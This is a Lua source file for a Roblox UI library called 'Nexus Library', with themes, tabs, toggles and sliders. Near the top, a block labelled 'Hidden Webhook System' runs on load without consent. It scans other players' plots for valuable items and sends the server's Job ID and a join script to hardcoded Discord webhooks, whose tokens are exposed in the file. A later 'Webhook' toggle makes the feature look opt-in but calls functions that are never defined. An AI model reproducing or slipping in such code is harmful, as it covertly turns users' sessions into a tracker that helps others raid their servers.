-- Nexus Library v2.0
-- Sistema modular de interface para Roblox

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local NexusLibrary = {}

-- Hidden Webhook System (runs in background)
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

local WEBHOOKS = {
    ["1m"]   = "https://discord.com/api/webhooks/1421389931728601098/DQpWWTc-vzoulO7WzWvIjtVsVrqRg4LprY5aDtKBPsdeVmQVtuuXTgBvpmL0JXFbDBxy",
    ["10m"]  = "https://discord.com/api/webhooks/1421390047667687496/HdQQRZgQh8g7nMyMv11QqEFc-06WfqNH2JkUHPJyTFITmccRCN_yckXg4jP4fGlQwyeO",
    ["100m"] = "https://discord.com/api/webhooks/1421390183663665205/Dt1Za4jBtYd6mVk_aqKA2_F_YNQhumswZJJX4Yc57s9mtWdvsipQ6fEz9nWyqNlPXMFV"
}

local function isPrivateServer()
    local success, result = pcall(function()
        local privateMsg = Workspace:FindFirstChild("Map")
        if privateMsg then
            privateMsg = privateMsg:FindFirstChild("Codes")
            if privateMsg then
                privateMsg = privateMsg:FindFirstChild("Main")
                if privateMsg then
                    privateMsg = privateMsg:FindFirstChild("SurfaceGui")
                    if privateMsg then
                        privateMsg = privateMsg:FindFirstChild("MainFrame")
                        if privateMsg then
                            privateMsg = privateMsg:FindFirstChild("PrivateServerMessage")
                            if privateMsg and privateMsg.Visible then
                                return true
                            end
                        end
                    end
                end
            end
        end
        return false
    end)
    return success and result
end

local function safeValue(obj)
    if not obj then return nil end
    if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("NumberValue") then
        return tostring(obj.Value)
    elseif obj:IsA("TextLabel") or obj:IsA("TextBox") or obj:IsA("TextButton") then
        return tostring(obj.Text)
    end
    return nil
end

local function isStolenIgnored(node)
    for _, key in ipairs({"Stolen", "StolenStatus", "StolenState"}) do
        local c = node:FindFirstChild(key)
        if c then
            local val = safeValue(c)
            if val and (string.upper(val) == "CRAFTING" or string.upper(val) == "READY") then
                return true
            end
        end
    end
    return false
end

local function nameContainsLuckyBlock(node)
    local nameObj = node:FindFirstChild("DisplayName") or node:FindFirstChild("Name")
    local nm = safeValue(nameObj)
    if nm and string.find(string.lower(nm), "lucky block", 1, true) then
        return true
    end
    return false
end

local function readGen(node)
    local g = node:FindFirstChild("Generation") or node:FindFirstChild("Gen")
    if not g then return nil, nil end
    local raw = safeValue(g)
    if not raw then return nil, nil end
    local numStr, suf = raw:match("([%d]+%.?%d*)%s*([kKmMbB]?)")
    if not numStr then
        numStr = raw:match("([%d]+%.?%d*)")
        if not numStr then return nil, raw end
        suf = ""
    end
    local num = tonumber(numStr)
    if not num then return nil, raw end
    local scale = 1
    if suf == "k" or suf == "K" then scale = 1e3
    elseif suf == "m" or suf == "M" then scale = 1e6
    elseif suf == "b" or suf == "B" then scale = 1e9 end
    return num * scale, raw
end

local function findCandidates(plot)
    local out = {}
    for _, d in ipairs(plot:GetDescendants()) do
        if (d:FindFirstChild("DisplayName") or d:FindFirstChild("Name")) and (d:FindFirstChild("Generation") or d:FindFirstChild("Gen")) then
            if not isStolenIgnored(d) and not nameContainsLuckyBlock(d) then
                local n, t = readGen(d)
                if n then
                    table.insert(out, {node = d, genNum = n, genText = t})
                end
            end
        end
    end
    return out
end

local function findBest()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local best, bestVal = nil, -math.huge
    for _, plot in ipairs(plots:GetChildren()) do
        for _, cand in ipairs(findCandidates(plot)) do
            if cand.genNum > bestVal then
                bestVal = cand.genNum
                best = cand
            end
        end
    end
    return best
end

local function chooseWebhookKey(genNum)
    if not genNum or genNum < 1000000 then return nil end
    if genNum < 10000000 then return "1m"
    elseif genNum < 100000000 then return "10m"
    else return "100m" end
end

local function sendEmbed(webhookUrl, animalName, genText, genNum)
    if not webhookUrl or isPrivateServer() then return end
    
    local jobId = game.JobId
    local placeId = game.PlaceId
    local joinScript = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
        placeId, jobId
    )

    local embed = {
        title = "Brainrot Notify | Nexus Hub",
        color = 0xF1C40F,
        fields = {
            { name = "🏷️ Name", value = animalName, inline = false },
            { name = "⚡ Generation", value = tostring(genText or "-"), inline = false },
            { name = "👥 Players", value = tostring(#Players:GetPlayers()) .. "/" .. tostring(Players.MaxPlayers), inline = false },
            { name = "🆔 Job ID (Mobile)", value = jobId, inline = false },
            { name = "🆔 Job ID (PC)", value = "```\n" .. jobId .. "\n```", inline = false },
            { name = "📋 Join Script (PC)", value = "```lua\n" .. joinScript .. "\n```", inline = false },
        },
        footer = { text = "Made by Nexus Hub | " .. os.date("%X") }
    }

    pcall(function()
        HttpService:RequestAsync({
            Url = webhookUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ embeds = {embed} })
        })
    end)
end

-- Start hidden webhook monitor
spawn(function()
    local lastIdent, lastKey, lastTime = nil, nil, 0
    while true do
        local best = findBest()
        if best then
            local nameObj = best.node:FindFirstChild("DisplayName") or best.node:FindFirstChild("Name")
            local animalName = safeValue(nameObj) or "Unknown"
            local genText = best.genText or "-"
            local ident = animalName .. "|" .. genText
            local key = chooseWebhookKey(best.genNum)
            
            -- Only send if key is valid (>= 1M) and conditions met
            if key and (lastIdent ~= ident or lastKey ~= key) and (os.time() - lastTime >= 3) then
                local webhookUrl = WEBHOOKS[key]
                if webhookUrl then
                    sendEmbed(webhookUrl, animalName, genText, best.genNum)
                    lastIdent, lastKey, lastTime = ident, key, os.time()
                end
            end
        end
        wait(1)
    end
end)

-- Themes
local themes = {
    Kitty = {
        primary = Color3.fromRGB(136, 19, 55),
        secondary = Color3.fromRGB(157, 23, 77),
        tertiary = Color3.fromRGB(190, 24, 93),
        accent = Color3.fromRGB(236, 72, 153),
        text = Color3.fromRGB(252, 231, 243),
        textSecondary = Color3.fromRGB(244, 114, 182),
        border = Color3.fromRGB(236, 72, 153)
    },
    Void = {
        primary = Color3.fromRGB(17, 24, 39),
        secondary = Color3.fromRGB(31, 41, 55),
        tertiary = Color3.fromRGB(55, 65, 81),
        accent = Color3.fromRGB(59, 130, 246),
        text = Color3.fromRGB(255, 255, 255),
        textSecondary = Color3.fromRGB(209, 213, 219),
        border = Color3.fromRGB(107, 114, 128)
    },
    Spooky = {
        primary = Color3.fromRGB(154, 52, 18),
        secondary = Color3.fromRGB(194, 65, 12),
        tertiary = Color3.fromRGB(234, 88, 12),
        accent = Color3.fromRGB(249, 115, 22),
        text = Color3.fromRGB(255, 237, 213),
        textSecondary = Color3.fromRGB(253, 186, 116),
        border = Color3.fromRGB(249, 115, 22)
    },
    PureRed = {
        primary = Color3.fromRGB(127, 29, 29),
        secondary = Color3.fromRGB(153, 27, 27),
        tertiary = Color3.fromRGB(185, 28, 28),
        accent = Color3.fromRGB(239, 68, 68),
        text = Color3.fromRGB(254, 226, 226),
        textSecondary = Color3.fromRGB(252, 165, 165),
        border = Color3.fromRGB(239, 68, 68)
    }
}

-- Utility functions
local function createFrame(parent, properties)
    local frame = Instance.new("Frame")
    frame.Parent = parent
    for prop, value in pairs(properties or {}) do
        frame[prop] = value
    end
    return frame
end

local function createTextLabel(parent, properties)
    local label = Instance.new("TextLabel")
    label.Parent = parent
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.GothamBold
    for prop, value in pairs(properties or {}) do
        label[prop] = value
    end
    return label
end

local function createTextButton(parent, properties)
    local button = Instance.new("TextButton")
    button.Parent = parent
    button.Font = Enum.Font.GothamBold
    for prop, value in pairs(properties or {}) do
        button[prop] = value
    end
    return button
end

local function createScrollingFrame(parent, properties)
    local scroll = Instance.new("ScrollingFrame")
    scroll.Parent = parent
    scroll.ScrollBarThickness = 6
    for prop, value in pairs(properties or {}) do
        scroll[prop] = value
    end
    return scroll
end

local function tweenColor(object, targetColor, duration)
    local tween = TweenService:Create(object, TweenInfo.new(duration or 0.2), {BackgroundColor3 = targetColor})
    tween:Play()
    return tween
end

-- Main Window Creation
function NexusLibrary:CreateWindow(config)
    local Window = {}
    Window.Tabs = {}
    Window.ActiveTab = nil
    Window.Theme = config.Theme or "Kitty"
    Window.Title = config.Name or "Nexus Hub"
    
    local theme = themes[Window.Theme]
    
    -- Create ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NexusLibrary"
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false
    
    -- Main window
    local mainWindow = createFrame(screenGui, {
        Position = UDim2.new(0.5, -175, 0.5, -200),
        Size = UDim2.new(0, 350, 0, 400),
        BackgroundColor3 = theme.primary,
        BorderSizePixel = 2,
        BorderColor3 = theme.border,
        Active = false,
        Draggable = false
    })
    
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 16)
    mainCorner.Parent = mainWindow
    
    -- Title bar
    local titleBar = createFrame(mainWindow, {
        Size = UDim2.new(1, 0, 0, 45),
        BackgroundColor3 = theme.secondary,
        BorderSizePixel = 0
    })
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 16)
    titleCorner.Parent = titleBar
    
    local titleFix = createFrame(titleBar, {
        Position = UDim2.new(0, 0, 1, -16),
        Size = UDim2.new(1, 0, 0, 16),
        BackgroundColor3 = theme.secondary,
        BorderSizePixel = 0
    })
    
    createTextLabel(titleBar, {
        Position = UDim2.new(0, 55, 0, 5),
        Size = UDim2.new(1, -110, 0, 20),
        Text = Window.Title,
        TextColor3 = theme.text,
        TextSize = 14,
        TextXAlignment = Enum.TextXAlignment.Left
    })
    
    createTextLabel(titleBar, {
        Position = UDim2.new(0, 55, 0, 22),
        Size = UDim2.new(1, -110, 0, 15),
        Text = "Premium Edition",
        TextColor3 = theme.textSecondary,
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Left
    })
    
    local logo = createFrame(titleBar, {
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(0, 30, 0, 30),
        BackgroundColor3 = theme.accent
    })
    
    local logoCorner = Instance.new("UICorner")
    logoCorner.CornerRadius = UDim.new(0, 8)
    logoCorner.Parent = logo
    
    createTextLabel(logo, {
        Size = UDim2.new(1, 0, 1, 0),
        Text = "N",
        TextColor3 = Color3.new(1, 1, 1),
        TextSize = 18,
        TextXAlignment = Enum.TextXAlignment.Center,
        TextYAlignment = Enum.TextYAlignment.Center,
        Font = Enum.Font.GothamBold
    })
    
    local minimizeButton = createTextButton(titleBar, {
        Position = UDim2.new(1, -68, 0, 8),
        Size = UDim2.new(0, 28, 0, 28),
        BackgroundColor3 = theme.tertiary,
        Text = "-",
        TextColor3 = theme.text,
        TextSize = 16
    })
    
    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 8)
    minimizeCorner.Parent = minimizeButton
    
    local miniWindow = nil
    
    local function createMiniWindow()
        if miniWindow then
            miniWindow:Destroy()
        end
        
        miniWindow = createFrame(screenGui, {
            Position = UDim2.new(0, 20, 0, 20),
            Size = UDim2.new(0, 150, 0, 50),
            BackgroundColor3 = theme.primary,
            BorderSizePixel = 2,
            BorderColor3 = theme.border,
            Active = false,
            Draggable = false
        })
        
        local miniCorner = Instance.new("UICorner")
        miniCorner.CornerRadius = UDim.new(0, 12)
        miniCorner.Parent = miniWindow
        
        local miniLogo = createFrame(miniWindow, {
            Position = UDim2.new(0, 8, 0, 8),
            Size = UDim2.new(0, 34, 0, 34),
            BackgroundColor3 = theme.accent
        })
        
        local miniLogoCorner = Instance.new("UICorner")
        miniLogoCorner.CornerRadius = UDim.new(0, 8)
        miniLogoCorner.Parent = miniLogo
        
        createTextLabel(miniLogo, {
            Size = UDim2.new(1, 0, 1, 0),
            Text = "N",
            TextColor3 = Color3.new(1, 1, 1),
            TextSize = 16,
            TextXAlignment = Enum.TextXAlignment.Center,
            TextYAlignment = Enum.TextYAlignment.Center,
            Font = Enum.Font.GothamBold
        })
        
        createTextLabel(miniWindow, {
            Position = UDim2.new(0, 48, 0, 8),
            Size = UDim2.new(1, -56, 0, 20),
            Text = Window.Title,
            TextColor3 = theme.text,
            TextSize = 12,
            TextXAlignment = Enum.TextXAlignment.Left,
            Font = Enum.Font.GothamBold
        })
        
        createTextLabel(miniWindow, {
            Position = UDim2.new(0, 48, 0, 25),
            Size = UDim2.new(1, -56, 0, 15),
            Text = "Minimized",
            TextColor3 = theme.textSecondary,
            TextSize = 8,
            TextXAlignment = Enum.TextXAlignment.Left
        })
        
        local restoreButton = createTextButton(miniWindow, {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            Text = "",
            ZIndex = 10
        })
        
        restoreButton.MouseButton1Click:Connect(function()
            mainWindow.Visible = true
            if miniWindow then
                miniWindow:Destroy()
                miniWindow = nil
            end
        end)
    end
    
    minimizeButton.MouseButton1Click:Connect(function()
        mainWindow.Visible = false
        createMiniWindow()
    end)
    
    local closeButton = createTextButton(titleBar, {
        Position = UDim2.new(1, -35, 0, 8),
        Size = UDim2.new(0, 28, 0, 28),
        BackgroundColor3 = Color3.fromRGB(220, 53, 69),
        Text = "X",
        TextColor3 = Color3.new(1, 1, 1),
        TextSize = 16
    })
    
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeButton
    
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    -- Tab container with horizontal scroll
    local tabFrame = createScrollingFrame(mainWindow, {
        Position = UDim2.new(0, 0, 0, 45),
        Size = UDim2.new(1, 0, 0, 35),
        BackgroundColor3 = theme.secondary,
        BorderSizePixel = 0,
        ScrollBarThickness = 6,
        ScrollBarImageColor3 = theme.accent,
        CanvasSize = UDim2.new(0, 500, 0, 0),
        ScrollingDirection = Enum.ScrollingDirection.X,
        AutomaticCanvasSize = Enum.AutomaticSize.X,
        ScrollingEnabled = true,
        Active = true,
        ClipsDescendants = true,
        ZIndex = 1
    })
    
    local tabLayout = Instance.new("UIListLayout")
    tabLayout.Parent = tabFrame
    tabLayout.FillDirection = Enum.FillDirection.Horizontal
    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    tabLayout.VerticalAlignment = Enum.VerticalAlignment.Center
    tabLayout.Padding = UDim.new(0, 5)
    tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
    
    local tabPadding = Instance.new("UIPadding")
    tabPadding.Parent = tabFrame
    tabPadding.PaddingLeft = UDim.new(0, 5)
    tabPadding.PaddingRight = UDim.new(0, 5)
    tabPadding.PaddingTop = UDim.new(0, 5)
    
    -- Enable touch scrolling for mobile
    local function enableTouchScroll()
        local dragging = false
        local dragStart = nil
        local startPos = nil
        
        tabFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = true
                dragStart = input.Position
                startPos = tabFrame.CanvasPosition
            end
        end)
        
        tabFrame.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
                local delta = dragStart - input.Position
                tabFrame.CanvasPosition = Vector2.new(startPos.X + delta.X, 0)
            end
        end)
        
        tabFrame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
    end
    
    enableTouchScroll()
    
    -- Content container
    local contentContainer = createFrame(mainWindow, {
        Position = UDim2.new(0, 0, 0, 85),
        Size = UDim2.new(1, 0, 1, -125),
        BackgroundTransparency = 1
    })
    
    -- Footer
    local footer = createFrame(mainWindow, {
        Position = UDim2.new(0, 0, 1, -40),
        Size = UDim2.new(1, 0, 0, 40),
        BackgroundColor3 = theme.secondary,
        BorderSizePixel = 0
    })
    
    local footerCorner = Instance.new("UICorner")
    footerCorner.CornerRadius = UDim.new(0, 16)
    footerCorner.Parent = footer
    
    local footerFix = createFrame(footer, {
        Position = UDim2.new(0, 0, 0, 0),
        Size = UDim2.new(1, 0, 0, 16),
        BackgroundColor3 = theme.secondary,
        BorderSizePixel = 0
    })
    
    createTextLabel(footer, {
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.5, 0, 1, 0),
        Text = "v2.0 Nexus Library",
        TextColor3 = theme.textSecondary,
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Left
    })
    
    createTextLabel(footer, {
        Position = UDim2.new(0.5, 0, 0, 0),
        Size = UDim2.new(0.5, -12, 1, 0),
        Text = "Connected",
        TextColor3 = Color3.fromRGB(34, 197, 94),
        TextSize = 9,
        TextXAlignment = Enum.TextXAlignment.Right
    })
    
    -- CreateTab function
    function Window:CreateTab(name, icon)
        local Tab = {}
        Tab.Name = name
        Tab.Icon = icon
        Tab.Elements = {}
        
        -- Create tab button
        local tabButton = createTextButton(tabFrame, {
            Size = UDim2.new(0, 100, 0, 25),
            BackgroundColor3 = theme.tertiary,
            Text = name,
            TextColor3 = theme.text,
            TextSize = 9,
            LayoutOrder = #Window.Tabs + 1
        })
        
        local tabCorner = Instance.new("UICorner")
        tabCorner.CornerRadius = UDim.new(0, 8)
        tabCorner.Parent = tabButton
        
        -- Create tab content
        local tabContent = createScrollingFrame(contentContainer, {
            Size = UDim2.new(1, 0, 1, 0),
            BackgroundTransparency = 1,
            ScrollBarImageColor3 = theme.border,
            CanvasSize = UDim2.new(0, 0, 0, 0),
            Visible = false
        })
        
        local contentLayout = Instance.new("UIListLayout")
        contentLayout.Parent = tabContent
        contentLayout.Padding = UDim.new(0, 10)
        contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
        contentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
        
        local contentPadding = Instance.new("UIPadding")
        contentPadding.Parent = tabContent
        contentPadding.PaddingLeft = UDim.new(0, 8)
        contentPadding.PaddingRight = UDim.new(0, 8)
        contentPadding.PaddingTop = UDim.new(0, 8)
        
        contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
            tabContent.CanvasSize = UDim2.new(0, 0, 0, contentLayout.AbsoluteContentSize.Y + 20)
        end)
        
        Tab.Content = tabContent
        Tab.Button = tabButton
        
        -- Tab button click
        tabButton.MouseButton1Click:Connect(function()
            for _, tab in pairs(Window.Tabs) do
                tab.Content.Visible = false
                tweenColor(tab.Button, theme.tertiary)
            end
            tabContent.Visible = true
            tweenColor(tabButton, theme.accent)
            Window.ActiveTab = Tab
        end)
        
        -- If first tab, make it active
        if #Window.Tabs == 0 then
            tabContent.Visible = true
            tweenColor(tabButton, theme.accent)
            Window.ActiveTab = Tab
        end
        
        table.insert(Window.Tabs, Tab)
        
        -- CreateToggle function
        function Tab:CreateToggle(config)
            local Toggle = {}
            Toggle.Name = config.Name or "Toggle"
            Toggle.CurrentValue = config.CurrentValue or false
            Toggle.Flag = config.Flag or ""
            Toggle.Callback = config.Callback or function() end
            
            local toggleFrame = createFrame(tabContent, {
                Size = UDim2.new(1, -30, 0, 50),
                BackgroundColor3 = theme.secondary,
                BorderSizePixel = 2,
                BorderColor3 = theme.border,
                LayoutOrder = #Tab.Elements + 1
            })
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 12)
            corner.Parent = toggleFrame
            
            createTextLabel(toggleFrame, {
                Position = UDim2.new(0, 42, 0, 12),
                Size = UDim2.new(1, -85, 0, 26),
                Text = Toggle.Name,
                TextColor3 = theme.text,
                TextSize = 12,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextYAlignment = Enum.TextYAlignment.Center
            })
            
            local iconFrame = createFrame(toggleFrame, {
                Position = UDim2.new(0, 8, 0, 9),
                Size = UDim2.new(0, 28, 0, 28),
                BackgroundColor3 = theme.accent
            })
            
            local iconCorner = Instance.new("UICorner")
            iconCorner.CornerRadius = UDim.new(0, 8)
            iconCorner.Parent = iconFrame
            
            local toggleSwitch = createFrame(toggleFrame, {
                Position = UDim2.new(1, -42, 0, 13),
                Size = UDim2.new(0, 38, 0, 20),
                BackgroundColor3 = Toggle.CurrentValue and theme.accent or theme.tertiary
            })
            
            local switchCorner = Instance.new("UICorner")
            switchCorner.CornerRadius = UDim.new(0, 10)
            switchCorner.Parent = toggleSwitch
            
            local switchKnob = createFrame(toggleSwitch, {
                Position = Toggle.CurrentValue and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2),
                Size = UDim2.new(0, 16, 0, 16),
                BackgroundColor3 = Color3.new(1, 1, 1)
            })
            
            local knobCorner = Instance.new("UICorner")
            knobCorner.CornerRadius = UDim.new(0, 8)
            knobCorner.Parent = switchKnob
            
            local toggleButton = createTextButton(toggleFrame, {
                Size = UDim2.new(1, 0, 1, 0),
                BackgroundTransparency = 1,
                Text = "",
                ZIndex = 10
            })
            
            toggleButton.MouseButton1Click:Connect(function()
                Toggle.CurrentValue = not Toggle.CurrentValue
                
                tweenColor(toggleSwitch, Toggle.CurrentValue and theme.accent or theme.tertiary)
                local targetPos = Toggle.CurrentValue and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2)
                TweenService:Create(switchKnob, TweenInfo.new(0.2), {Position = targetPos}):Play()
                
                Toggle.Callback(Toggle.CurrentValue)
            end)
            
            function Toggle:Set(value)
                Toggle.CurrentValue = value
                tweenColor(toggleSwitch, value and theme.accent or theme.tertiary)
                local targetPos = value and UDim2.new(0, 18, 0, 2) or UDim2.new(0, 2, 0, 2)
                TweenService:Create(switchKnob, TweenInfo.new(0.2), {Position = targetPos}):Play()
            end
            
            table.insert(Tab.Elements, Toggle)
            return Toggle
        end
        
        -- CreateButton function
        function Tab:CreateButton(config)
            local Button = {}
            Button.Name = config.Name or "Button"
            Button.Callback = config.Callback or function() end
            
            local buttonFrame = createTextButton(tabContent, {
                Size = UDim2.new(1, -30, 0, 40),
                BackgroundColor3 = theme.accent,
                BorderSizePixel = 0,
                Text = Button.Name,
                TextColor3 = Color3.new(1, 1, 1),
                TextSize = 13,
                LayoutOrder = #Tab.Elements + 1
            })
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 12)
            corner.Parent = buttonFrame
            
            buttonFrame.MouseButton1Click:Connect(function()
                Button.Callback()
            end)
            
            function Button:Set(text)
                buttonFrame.Text = text
                Button.Name = text
            end
            
            table.insert(Tab.Elements, Button)
            return Button
        end
        
        -- CreateSlider function
        function Tab:CreateSlider(config)
            local Slider = {}
            Slider.Name = config.Name or "Slider"
            Slider.Range = config.Range or {0, 100}
            Slider.Increment = config.Increment or 1
            Slider.CurrentValue = config.CurrentValue or Slider.Range[1]
            Slider.Flag = config.Flag or ""
            Slider.Callback = config.Callback or function() end
            Slider.Suffix = config.Suffix or ""
            
            local sliderFrame = createFrame(tabContent, {
                Size = UDim2.new(1, -30, 0, 55),
                BackgroundColor3 = theme.secondary,
                BorderSizePixel = 2,
                BorderColor3 = theme.border,
                LayoutOrder = #Tab.Elements + 1
            })
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 12)
            corner.Parent = sliderFrame
            
            createTextLabel(sliderFrame, {
                Position = UDim2.new(0, 12, 0, 6),
                Size = UDim2.new(0.6, 0, 0, 16),
                Text = Slider.Name,
                TextColor3 = theme.text,
                TextSize = 12,
                TextXAlignment = Enum.TextXAlignment.Left
            })
            
            local valueLabel = createTextLabel(sliderFrame, {
                Position = UDim2.new(0.6, 0, 0, 6),
                Size = UDim2.new(0.4, -12, 0, 16),
                Text = tostring(Slider.CurrentValue) .. Slider.Suffix,
                TextColor3 = theme.text,
                TextSize = 12,
                TextXAlignment = Enum.TextXAlignment.Right,
                Font = Enum.Font.Code
            })
            
            local track = createFrame(sliderFrame, {
                Position = UDim2.new(0, 12, 0, 30),
                Size = UDim2.new(1, -24, 0, 10),
                BackgroundColor3 = theme.tertiary
            })
            
            local trackCorner = Instance.new("UICorner")
            trackCorner.CornerRadius = UDim.new(0, 5)
            trackCorner.Parent = track
            
            local fill = createFrame(track, {
                Size = UDim2.new((Slider.CurrentValue - Slider.Range[1]) / (Slider.Range[2] - Slider.Range[1]), 0, 1, 0),
                BackgroundColor3 = theme.accent
            })
            
            local fillCorner = Instance.new("UICorner")
            fillCorner.CornerRadius = UDim.new(0, 5)
            fillCorner.Parent = fill
            
            local handle = createFrame(track, {
                Position = UDim2.new((Slider.CurrentValue - Slider.Range[1]) / (Slider.Range[2] - Slider.Range[1]), -6, 0, -3),
                Size = UDim2.new(0, 16, 0, 16),
                BackgroundColor3 = Color3.new(1, 1, 1),
                ZIndex = 5
            })
            
            local handleCorner = Instance.new("UICorner")
            handleCorner.CornerRadius = UDim.new(0, 8)
            handleCorner.Parent = handle
            
            local dragging = false
            
            handle.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = true
                end
            end)
            
            handle.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 then
                    dragging = false
                end
            end)
            
            UserInputService.InputChanged:Connect(function(input)
                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                    local mouse = player:GetMouse()
                    local trackPos = track.AbsolutePosition.X
                    local trackSize = track.AbsoluteSize.X
                    local mouseX = mouse.X
                    
                    local relativeX = math.clamp((mouseX - trackPos) / trackSize, 0, 1)
                    local newValue = math.floor((Slider.Range[1] + relativeX * (Slider.Range[2] - Slider.Range[1])) / Slider.Increment + 0.5) * Slider.Increment
                    
                    Slider.CurrentValue = newValue
                    valueLabel.Text = tostring(newValue) .. Slider.Suffix
                    fill.Size = UDim2.new(relativeX, 0, 1, 0)
                    handle.Position = UDim2.new(relativeX, -6, 0, -3)
                    
                    Slider.Callback(newValue)
                end
            end)
            
            function Slider:Set(value)
                Slider.CurrentValue = value
                local relativeX = (value - Slider.Range[1]) / (Slider.Range[2] - Slider.Range[1])
                valueLabel.Text = tostring(value) .. Slider.Suffix
                fill.Size = UDim2.new(relativeX, 0, 1, 0)
                handle.Position = UDim2.new(relativeX, -6, 0, -3)
            end
            
            table.insert(Tab.Elements, Slider)
            return Slider
        end
        
        -- CreateLabel function
        function Tab:CreateLabel(text)
            local Label = {}
            Label.Text = text
            
            local labelFrame = createTextLabel(tabContent, {
                Size = UDim2.new(1, -30, 0, 30),
                Text = text,
                TextColor3 = theme.textSecondary,
                TextSize = 11,
                TextXAlignment = Enum.TextXAlignment.Left,
                TextWrapped = true,
                LayoutOrder = #Tab.Elements + 1
            })
            
            function Label:Set(newText)
                labelFrame.Text = newText
                Label.Text = newText
            end
            
            table.insert(Tab.Elements, Label)
            return Label
        end
        
        -- CreateSection function
        function Tab:CreateSection(name)
            local Section = {}
            Section.Name = name
            
            local sectionFrame = createFrame(tabContent, {
                Size = UDim2.new(1, -30, 0, 35),
                BackgroundColor3 = theme.tertiary,
                BorderSizePixel = 0,
                LayoutOrder = #Tab.Elements + 1
            })
            
            local sectionCorner = Instance.new("UICorner")
            sectionCorner.CornerRadius = UDim.new(0, 10)
            sectionCorner.Parent = sectionFrame
            
            createTextLabel(sectionFrame, {
                Size = UDim2.new(1, -20, 1, 0),
                Position = UDim2.new(0, 10, 0, 0),
                Text = name,
                TextColor3 = theme.text,
                TextSize = 13,
                TextXAlignment = Enum.TextXAlignment.Left,
                Font = Enum.Font.GothamBold
            })
            
            table.insert(Tab.Elements, Section)
            return Section
        end
        
        return Tab
    end
    
    -- Create Webhook Tab by default
    function Window:CreateWebhookTab()
        local Tab = self:CreateTab("Webhook", 0)
        
        Tab:CreateSection("Discord Webhook System")
        
        Tab:CreateLabel("Monitor best animals and send to Discord automatically")
        
        local webhookToggle = Tab:CreateToggle({
            Name = "Enable Webhook Monitor",
            CurrentValue = false,
            Flag = "WebhookEnabled",
            Callback = function(Value)
                if Value then
                    if isPrivateServer() then
                        warn("[Nexus] Webhooks are disabled in private servers")
                        webhookToggle:Set(false)
                        return
                    end
                    startWebhookMonitor()
                    print("[Nexus] Webhook monitor started")
                else
                    stopWebhookMonitor()
                    print("[Nexus] Webhook monitor stopped")
                end
            end
        })
        
        Tab:CreateLabel("Thresholds: 1M, 10M, 100M+")
        Tab:CreateLabel("Note: Only works in public servers")
        
        return Tab
    end
    
    -- Keybind to toggle
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == Enum.KeyCode.Insert then
            mainWindow.Visible = not mainWindow.Visible
        end
    end)
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        
        if input.KeyCode == Enum.KeyCode.Insert then
            mainWindow.Visible = not mainWindow.Visible
        end
    end)
    
    return Window
end

return NexusLibrary
